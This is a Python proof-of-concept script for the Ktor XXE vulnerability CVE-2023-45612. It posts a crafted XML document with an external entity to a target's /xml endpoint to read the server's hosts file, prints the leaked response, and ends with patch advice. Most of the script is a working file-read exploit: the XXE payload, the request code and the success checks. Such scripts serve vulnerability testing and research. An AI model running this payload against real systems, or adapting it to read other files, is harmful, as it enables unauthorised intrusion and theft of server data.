#!/usr/bin/env python3
"""
CVE-2023-45612 Simple XXE Proof of Concept
Ktor Framework XML External Entity Vulnerability

This script demonstrates the XXE vulnerability in Ktor versions prior to 2.3.5.
It attempts to read C:\Windows\System32\drivers\etc\hosts file from the target server.

Usage: python simple_xxe_poc.py [URL]
Example: python simple_xxe_poc.py http://localhost:8080
"""

import requests
import sys


def test_xxe_vulnerability(base_url="http://localhost:8080"):
    """
    Test for CVE-2023-45612 XXE vulnerability in Ktor ContentNegotiation
    
    Args:
        base_url: Target Ktor server URL
        
    Returns:
        bool: True if vulnerability is confirmed, False otherwise
    """
    
    print("=" * 60)
    print("CVE-2023-45612 XXE Vulnerability Test")
    print("=" * 60)
    print(f"Target: {base_url}")
    print(f"File to read: C:\\Windows\\System32\\drivers\\etc\\hosts")
    print()
    
    # Test server connectivity
    try:
        response = requests.get(base_url, timeout=5)
        print(f"✓ Server is accessible (Status: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"✗ Cannot connect to server: {e}")
        return False
    
    # Create XXE payload to read hosts file
    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE UserData [
<!ELEMENT UserData ANY>
<!ELEMENT name ANY>
<!ELEMENT email ANY>
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<UserData>
    <name>&xxe;</name>
    <email>test@example.com</email>
</UserData>'''
    
    print("Sending XXE payload to /xml endpoint...")
    print()
    
    # Send XXE payload
    try:
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': 'XXE-PoC/1.0'
        }
        
        response = requests.post(
            f"{base_url}/xml", 
            data=xxe_payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f"Response Status: {response.status_code}")
        print(f"Response Body:")
        print("-" * 40)
        print(response.text)
        print("-" * 40)
        print()
        
        # Check for successful XXE attack
        response_text = response.text.lower()
        success_indicators = [
            "127.0.0.1" in response_text,      # hosts file content
            "localhost" in response_text,      # hosts file content  
            "xxe_success" in response_text,    # our custom success marker
            len(response.text) > 100 and "received user:" in response_text  # expanded content
        ]
        
        if any(success_indicators):
            print("🚨 VULNERABILITY CONFIRMED!")
            print("✓ XXE attack successful - file contents leaked")
            print("✓ CVE-2023-45612 vulnerability present")
            print()
            print("IMPACT:")
            print("- Sensitive files can be read from the server")
            print("- Server-side request forgery (SSRF) possible")
            print("- Potential for further exploitation")
            print()
            print("RECOMMENDATION:")
            print("- Update Ktor to version 2.3.5 or later")
            print("- Update xmlutil to version 0.86.2 or later")
            print("- Review XML processing security configuration")
            return True
        else:
            print("✓ No XXE vulnerability detected")
            print("Server appears to be patched or not vulnerable")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"✗ Request failed: {e}")
        return False


def main():
    """Main function to run the XXE test"""
    
    # Get target URL from command line or use default
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "http://localhost:8080"
    
    # Remove trailing slash
    target_url = target_url.rstrip('/')
    
    # Run the test
    is_vulnerable = test_xxe_vulnerability(target_url)
    
    # Exit with appropriate code
    if is_vulnerable:
        print("\n⚠️  SECURITY RISK: This application is vulnerable to CVE-2023-45612")
        sys.exit(1)
    else:
        print("\n✅ SECURE: No XXE vulnerability detected")
        sys.exit(0)


if __name__ == "__main__":
    main()
